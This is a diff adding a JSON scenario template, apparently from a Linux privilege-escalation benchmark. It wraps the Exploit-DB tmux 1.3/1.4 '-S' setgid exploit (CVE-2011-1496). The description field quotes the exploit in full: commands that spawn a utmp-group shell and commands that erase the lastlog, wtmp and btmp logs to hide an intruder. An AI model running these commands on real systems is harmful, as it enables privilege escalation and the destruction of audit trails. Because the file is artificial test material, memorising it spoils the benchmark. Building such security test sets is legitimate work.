@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_17147",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: tmux 1.3/1.4 - '-S' Option Incorrect SetGID Privilege Escalation (CVE-2011-1496;OSVDB-71883)\n\nExploit source code (17147.txt):\n```\n---------------------------------------\n| Team ph0x90bic proudly presents     |\n| tmux -S 1.3/1.4 local utmp exploit  |\n---------------------------------------\n\n# Exploit Title: tmux '-S' Option Incorrect SetGID Local Privilege Escalation Vulnerability\n# Date: 11.04.2011\n# Author: ph0x90bic\n# Software Link: http://tmux.sourceforge.net/\n# Version: 1.3/1.4\n# Tested on: Linux debian 2.6.26-1-686\n# CVE : CVE-2011-1496\n\n---\n\nINTRODUCTION\n\ntmux 1.3/1.4 contains a privilege escalation vulnerabillity,\nwhich gives you utmp group privileges. This bug is important,\nbecause it is possible to clean logfiles and use logcleaners\nfor btmp, wtmp and lastlog without local root access.\n\n---\n\nEXPLOIT\n\nExecute shell as utmp group\n\n$ tmux -S /tmp/.whateveryouwant -c id\nuid=1001(company) gid=1001(company) egid=43(utmp), groups=1001(company)\n\n$ tmux -S /tmp/.whateveryouwant -c /bin/sh\n$ id\nuid=1001(company) gid=1001(company) egid=43(utmp), groups=1001(company)\n\n--\n\nDelete logfiles\n\n$ tmux -S /tmp/.whateveryouwant -c '> /var/log/lastlog'\n$ tmux -S /tmp/.whateveryouwant -c '> /var/log/wtmp'\n$ tmux -S /tmp/.whateveryouwant -c '> /var/log/btmp'\n\n--\n\nUse logcleaner software\n\n$ tmux -S /tmp/.whateveryouwant -c /tmp/thcclear13/cleara hacker-username\n```",
+  "cve": "CVE-2011-1496;OSVDB-71883",
+  "exploitdb_id": "17147",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_17147",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
